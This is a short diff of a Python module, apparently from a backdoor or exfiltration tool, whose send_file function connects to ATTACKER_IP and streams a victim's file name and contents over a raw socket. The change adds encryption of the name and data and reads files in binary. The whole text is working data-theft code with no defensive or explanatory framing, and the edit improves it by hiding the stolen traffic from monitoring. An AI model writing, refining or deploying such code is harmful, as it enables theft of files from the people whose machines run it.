@@ -1,17 +1,17 @@
 import socket
 from config import *
 from crypto import *
+import os
 
-
-def send_file(file_name):
+def send_file(file_path):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((ATTACKER_IP, FILE_TRANSFER_PORT))
 
-    file = open(file_name, 'r')
-    s.send(file_name)
+    file = open(file_path, 'rb')
+    s.send(encrypt(os.path.split(file_path)[1]))
     data = file.read(4096)
     while 1:
-        s.send(data)
+        s.send(encrypt(data))
         data = file.read(4096)
         if not data:
             break
